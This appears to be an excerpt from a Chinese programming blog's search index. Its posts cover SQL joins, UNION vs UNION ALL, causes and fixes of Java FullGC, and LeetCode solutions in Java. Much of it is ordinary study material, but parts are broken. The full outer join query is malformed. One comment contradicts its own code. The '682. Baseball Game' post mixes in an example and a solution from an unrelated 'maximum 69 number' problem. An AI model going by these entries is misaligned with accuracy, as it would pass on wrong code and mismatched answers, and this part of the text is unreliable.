<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">FROM</span> A <span class="keyword">full</span> outter <span class="keyword">join</span> <span class="keyword">WHERE</span> A.key <span class="keyword">is</span> <span class="literal">null</span> <span class="keyword">or</span> B.key <span class="keyword">is</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-20-join8.png" alt="left excluding join"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.codeproject.com/Articles/33052/Visual-Representation-of-SQL-Joins" target="_blank" rel="noopener">Visual Representation of SQL Joins</a></p>
<p><a href="https://mazhuang.org/2017/09/11/joins-in-sql" target="_blank" rel="noopener">图解 SQL 里的各种 JOIN</a></p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>join</tag>
        <tag>left join</tag>
        <tag>right join</tag>
        <tag>inner join</tag>
        <tag>full outter join</tag>
        <tag>cross join</tag>
        <tag>self join</tag>
      </tags>
  </entry>
  <entry>
    <title>union和union all的区别</title>
    <url>/2020/04/20/MySQL/2020-04-20-union%E5%92%8Cunion%20all%20%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="union和union-all的区别"><a href="#union和union-all的区别" class="headerlink" title="union和union all的区别"></a>union和union all的区别</h1><p>union 和 union all 都可以将多个结果集进行合并。合并的时候两个表的对应的列数和数据类型必须相同</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">from</span> A <span class="keyword">union</span> <span class="keyword">select</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">from</span> B <span class="keyword">union</span> <span class="keyword">select</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">from</span> C</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">from</span> A <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">from</span> B <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">from</span> C</span><br></pre></td></tr></table></figure>

<h2 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h2><p>union 和 union all的区别就是：</p>
<ul>
<li>union 会对结果集进行筛选，去重</li>
<li>union会对结果按照默认的排序规则排序</li>
<li>因为union all 不会对结果集进行去重和排序处理，所以，union all效率会比union高很多。</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-04-20-union.jpg" alt="union和union all"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/040a0f9a30ef" target="_blank" rel="noopener">union和union all 的区别</a></p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>union</tag>
        <tag>union all</tag>
      </tags>
  </entry>
  <entry>
    <title>FullGC产生的条件，定位方法以及解决策略</title>
    <url>/2020/04/20/Java/JVM/2020-04-20-FullGC%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6%EF%BC%8C%E5%AE%9A%E4%BD%8D%E6%96%B9%E6%B3%95%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h1 id="FullGC产生的条件，定位方法以及解决策略"><a href="#FullGC产生的条件，定位方法以及解决策略" class="headerlink" title="FullGC产生的条件，定位方法以及解决策略"></a>FullGC产生的条件，定位方法以及解决策略</h1><h2 id="产生的条件"><a href="#产生的条件" class="headerlink" title="产生的条件"></a>产生的条件</h2><h3 id="调用System-gc-方法"><a href="#调用System-gc-方法" class="headerlink" title="调用System.gc()方法"></a>调用System.gc()方法</h3><p>System.gc()方法会告诉JVM需要启动一次fullGC，但是JVM自己判断什么时候开始启动这次fullGC。</p>
<p>在FullGC的时候，会Stop The World。可以通过配置-XX：+DisableExplicitGC来禁用System.gc().</p>
<h3 id="堆内存空间不足"><a href="#堆内存空间不足" class="headerlink" title="堆内存空间不足"></a>堆内存空间不足</h3><p>预先将堆空间设置为20M，然后新生代大小设置为10M，执行如下的程序触发GC。</p>
<p>JVM 参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms20m</span><br><span class="line">-Xmx20m</span><br><span class="line">-XX:+PrintGCTimeStamps</span><br><span class="line">-XX:+PrintGCDetails</span><br><span class="line">-verbose:gc</span><br><span class="line">-Xmn10M</span><br><span class="line">-XX:SurvivorRatio&#x3D;8</span><br><span class="line">-Xloggc:d:&#x2F;gc.log</span><br></pre></td></tr></table></figure>

<p>每次生成10M的数据，循环100次</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = <span class="number">100</span>;</span><br><span class="line">		<span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">10</span>];</span><br><span class="line">			n--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>这样就会触发FullGC，并且导致堆内存溢出</p>
<p><img src="https://huhansi.github.io/images/2020-04-20-gc.png" alt="内存溢出"></p>
<p>GC日志是：</p>
<p><img src="https://huhansi.github.io/images/2020-04-20-gc1.png" alt="GC日志"></p>
<p>可以看出虚拟机做了两次FullGC，但是回收之后，内存空间还是不够，导致溢出</p>
<h3 id="永久代空间不足"><a href="#永久代空间不足" class="headerlink" title="永久代空间不足"></a>永久代空间不足</h3><p>永久代在Java8中已经用元空间替换了。永久代代表空间Perm Gen。它主要用于存储常量池以及虚拟机加载的类元数据信息。</p>
<h3 id="元空间不足"><a href="#元空间不足" class="headerlink" title="元空间不足"></a>元空间不足</h3><p>元空间在JDK 8之后出现，作为永久代的替代者。元数据空间没有直接使用JVM的内存，它用的是操作系统的内存，只有在操作系统的内存也被占满之后，元空间才会OOM</p>
<h3 id="老年代空间不足"><a href="#老年代空间不足" class="headerlink" title="老年代空间不足"></a>老年代空间不足</h3><p>当新生代的对象经过多次垃圾回收之后，准备移入老年代时，老年代的空间不够，就会催发一次FullGC。</p>
<h3 id="内存担保机制失败"><a href="#内存担保机制失败" class="headerlink" title="内存担保机制失败"></a>内存担保机制失败</h3><p>在JVM发生minor gc之前，JVM会先判断老年代的最大可用的连续空间是否大于新生代所有对象的总空间。</p>
<p>如果大于的话，则minor GC是安全的，进行一次minor GC</p>
<p>如果小于的话，则判断虚拟机的HandlePromotionFailure参数，</p>
<ul>
<li><p>如果为true，说明JVM允许担保失败，会继续检测老年代最大可用的连续空间&gt;历次晋升到老年代对象的平均大小。若大于，将尝试进行一次minor gc，若失败，则重新进行一次full gc。</p>
</li>
<li><p>如果为false，则不允许毛线，需要进行Full GC</p>
</li>
</ul>
<h3 id="CMS-GC回收出现promotion-failed或concurrent-mode-failure"><a href="#CMS-GC回收出现promotion-failed或concurrent-mode-failure" class="headerlink" title="CMS GC回收出现promotion failed或concurrent mode failure"></a>CMS GC回收出现promotion failed或concurrent mode failure</h3><p><strong>promotion failed</strong>：在 Minor GC 过程中，Survivor Unused 可能不足以容纳 Eden 和另一个 Survivor 中的存活对象， 那么多余的将被移到老年代， 称为过早提升（Premature Promotion）。 这会导致老年代中短期存活对象的增长， 可能会引发严重的性能问题。  再进一步， 如果老年代满了， Minor GC 后会进行 Full GC， 这将导致遍历整个堆， 称为提升失败（Promotion Failure）。</p>
<p><strong>concurrent mode faulure</strong>：在CMS的并发标记和并发清理阶段，用户线程还是在继续运行，伴随着新的垃圾对象不断产生，但，这一部分垃圾对象是出现在标记过程结束以后，无法在档次收集中处理掉。另外，因此清理是和用户线程一起执行的，那就必须预留一定的空间给用户线程。如果预留的内存无法满足程序分配新对象的需要，就会出现一次“并发失败”。</p>
<h2 id="定位方法"><a href="#定位方法" class="headerlink" title="定位方法"></a>定位方法</h2><p>当系统出现频繁的响应超时或者CPU100时，可以怀疑下是否频繁FullGC导致系统响应慢且狂消耗资源了。</p>
<p>可以通过GC日志分析FullGC的频次；</p>
<p>也可以通过JVM自带的工具，jstat，或者阿里的Arthas</p>
<h2 id="解决策略"><a href="#解决策略" class="headerlink" title="解决策略"></a>解决策略</h2><ul>
<li><p>禁用System.gc方法，JVM启动时设置参数+DisableExplicitGC</p>
</li>
<li><p>针对老年代空间不足的问题，尽量做到使对象在新生代就被回收，而不是等到到了老年代之后才被回收。然后根据业务场景分配合适的老年代空间大小。</p>
</li>
<li><p>针对永久代（JDK8之前），可以适当增大永久代的空间，或者在类Class信息不再使用的时候，即使卸载。</p>
</li>
<li><p>采用CMS，那么<strong>可以设置进行 n 次 CMS 后进行一次压缩式 Full GC</strong>，参数如下：</p>
<p>  -XX:+UseCMSCompactAtFullCollection：允许在 Full GC 时，启用压缩式 GC</p>
<p>  -XX:CMSFullGCBeforeCompaction=n   在进行 n 次，CMS 后，进行一次压缩的 Full GC，用以减少 CMS 产生的碎片。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>FullGC</tag>
      </tags>
  </entry>
  <entry>
    <title>102. 二叉树的层序遍历</title>
    <url>/2020/04/17/LeetCode/leetcode-000102.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>从上到下按层打印二叉树，同一层的节点按从左到右的顺序打印，每一层打印到一行。</p>
<p>例如:<br> 给定二叉树: <code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>

<p>返回其层次遍历结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  [<span class="number">3</span>],</span><br><span class="line">  [<span class="number">9</span>,<span class="number">20</span>],</span><br><span class="line">  [<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>节点总数 &lt;= 1000</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>迭代法</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">		List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Queue&lt;TreeNode&gt; nodes = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">		nodes.add(root);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (!nodes.isEmpty()) &#123;</span><br><span class="line">			List&lt;Integer&gt; tmp = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = nodes.size(); i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">				TreeNode node = nodes.poll();</span><br><span class="line">				tmp.add(node.val);</span><br><span class="line">				<span class="keyword">if</span> (node.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">					nodes.add(node.left);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (node.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">					nodes.add(node.right);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			result.add(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>169. 多数元素</title>
    <url>/2020/04/17/LeetCode/leetcode-000169.%20%E5%A4%9A%E6%95%B0%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个大小为 n 的数组，找到其中的多数元素。多数元素是指在数组中出现次数大于 ⌊ n/2 ⌋ 的元素。</p>
<p>你可以假设数组是非空的，并且给定的数组总是存在多数元素。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [3,2,3]</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,2,1,1,1,2,2]</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= 数组长度 &lt;= 50000</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == nums || <span class="number">0</span> == nums.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> == nums.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> length = nums.length / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(num)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (map.get(num) + <span class="number">1</span> &gt; length) &#123;</span><br><span class="line">                    <span class="keyword">return</span> num;</span><br><span class="line">                &#125;</span><br><span class="line">                map.replace(num, map.get(num) + <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(num, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>如果数字出现的次数大于数组的一半的话，排序完之后，中间位置的肯定就是那个数字。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int majorityElement(int[] nums) &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        return nums[nums.length &#x2F; 2];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题68 - II. 二叉树的最近公共祖先</title>
    <url>/2020/04/17/LeetCode/leetcode-000236.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/15/binarytree.png" alt></p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 1</span><br><span class="line">输出: 3</span><br><span class="line">解释: 节点 5 和节点 1 的最近公共祖先是节点 3。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 4</span><br><span class="line">输出: 5</span><br><span class="line">解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>所有节点的值都是唯一的。</li>
<li>p、q 为不同节点且均存在于给定的二叉树中。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">     	<span class="comment">//返回节点存在情况</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span> || p == root || q ==root)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="comment">//再左右子树寻找 p q 两个节点</span></span><br><span class="line">        TreeNode left = lowestCommonAncestor(root.left,p,q);</span><br><span class="line">        TreeNode right = lowestCommonAncestor(root.right,p,q);</span><br><span class="line">        <span class="comment">//情况1：如果右子树找不到 p 或 q 即(right==null)，</span></span><br><span class="line">        <span class="comment">//那么说明 p 和 q 都在左子树上，返回 left </span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//情况2：如果左子树找不到 p 或 q 即(right==null)，</span></span><br><span class="line">        <span class="comment">//那么说明 p 和 q 都在右子树上，返回 right</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果上述情况都不符合，说明 p 和 q 分别在左子树和右子树，</span></span><br><span class="line">        <span class="comment">//那么最近公共节点为当前节点</span></span><br><span class="line">        <span class="comment">//直接返回 root 即可</span></span><br><span class="line">        <span class="keyword">return</span> (right == <span class="keyword">null</span>) ? left : (left == <span class="keyword">null</span>) ? right : root;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>509. 斐波那契数</title>
    <url>/2020/04/17/LeetCode/leetcode-000509-%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>斐波那契数</strong>，通常用 <code>F(n)</code> 表示，形成的序列称为<strong>斐波那契数列</strong>。该数列由 <code>0</code> 和 <code>1</code> 开始，后面的每一项数字都是前面两项数字的和。也就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F(0) &#x3D; 0,   F(1) &#x3D; 1</span><br><span class="line">F(N) &#x3D; F(N - 1)+ F(N - 2), 其中 N &gt; 1.</span><br></pre></td></tr></table></figure>

<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：2</span><br><span class="line">输出：1</span><br><span class="line">解释：F(2) &#x3D; F(1) + F(0) &#x3D; 1 + 0 &#x3D; 1.</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：3</span><br><span class="line">输出：2</span><br><span class="line">解释：F(3) &#x3D; F(2) + F(1) &#x3D; 1 + 1 &#x3D; 2.</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：4</span><br><span class="line">输出：3</span><br><span class="line">解释：F(4) &#x3D; F(3) + F(2) &#x3D; 2 + 1 &#x3D; 3.</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>0 ≤ <code>N</code> ≤ 30</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>迭代法</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == N || <span class="number">1</span> == N) &#123;</span><br><span class="line">			<span class="keyword">return</span> N;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> f0 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> f1 = <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (N &gt; <span class="number">1</span>) &#123;</span><br><span class="line">			result = f0 + f1;</span><br><span class="line">			f0 = f1;</span><br><span class="line">			f1 = result;</span><br><span class="line">			N--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>递归</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (N &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> N;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fib(N-<span class="number">1</span>) + fib(N-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>公式法</p>
<p>使用黄金分割比：φ=1+52≈1.6180339887….\varphi = \frac{1 + \sqrt{5}}{2} \approx 1.6180339887….φ=21+5<br>≈1.6180339887….，Binet 公式 ：</p>
<p><img src="https://huhansi.github.io/images/2020-04-17-leetcode.png" alt></p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> goldenRatio = (<span class="number">1</span> + Math.sqrt(<span class="number">5</span>)) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)Math.round(Math.pow(goldenRatio, N)/ Math.sqrt(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>682. 棒球比赛</title>
    <url>/2020/04/17/LeetCode/leetcode-000682.%20%E6%A3%92%E7%90%83%E6%AF%94%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你现在是棒球比赛记录员。<br>给定一个字符串列表，每个字符串可以是以下四种类型之一：<br>1.整数（一轮的得分）：直接表示您在本轮中获得的积分数。<br>2. “+”（一轮的得分）：表示本轮获得的得分是前两轮有效 回合得分的总和。<br>3. “D”（一轮的得分）：表示本轮获得的得分是前一轮有效 回合得分的两倍。<br>4. “C”（一个操作，这不是一个回合的分数）：表示您获得的最后一个有效 回合的分数是无效的，应该被移除。</p>
<p>每一轮的操作都是永久性的，可能会对前一轮和后一轮产生影响。<br>你需要返回你在所有回合中得分的总和。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [&quot;5&quot;,&quot;2&quot;,&quot;C&quot;,&quot;D&quot;,&quot;+&quot;]</span><br><span class="line">输出: 30</span><br><span class="line">解释: </span><br><span class="line">第1轮：你可以得到5分。总和是：5。</span><br><span class="line">第2轮：你可以得到2分。总和是：7。</span><br><span class="line">操作1：第2轮的数据无效。总和是：5。</span><br><span class="line">第3轮：你可以得到10分（第2轮的数据已被删除）。总数是：15。</span><br><span class="line">第4轮：你可以得到5 + 10 &#x3D; 15分。总数是：30。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：num = <span class="number">9996</span></span><br><span class="line">输出：<span class="number">9999</span></span><br><span class="line">解释：将最后一位从 <span class="number">6</span> 变到 <span class="number">9</span>，其结果 <span class="number">9999</span> 是最大的数。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [&quot;5&quot;,&quot;-2&quot;,&quot;4&quot;,&quot;C&quot;,&quot;D&quot;,&quot;9&quot;,&quot;+&quot;,&quot;+&quot;]</span><br><span class="line">输出: 27</span><br><span class="line">解释: </span><br><span class="line">第1轮：你可以得到5分。总和是：5。</span><br><span class="line">第2轮：你可以得到-2分。总数是：3。</span><br><span class="line">第3轮：你可以得到4分。总和是：7。</span><br><span class="line">操作1：第3轮的数据无效。总数是：3。</span><br><span class="line">第4轮：你可以得到-4分（第三轮的数据已被删除）。总和是：-1。</span><br><span class="line">第5轮：你可以得到9分。总数是：8。</span><br><span class="line">第6轮：你可以得到-4 + 9 &#x3D; 5分。总数是13。</span><br><span class="line">第7轮：你可以得到9 + 5 &#x3D; 14分。总数是27。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>输入列表的大小将介于1和1000之间。</li>
<li>列表中的每个整数都将介于-30000和30000之间。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用栈</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximum69Number</span> <span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">        String strNum = String.valueOf(num);</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : strNum.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (flag &amp;&amp; <span class="string">'6'</span> == c) &#123;</span><br><span class="line">                sb.append(<span class="string">'9'</span>);</span><br><span class="line">                flag = <span 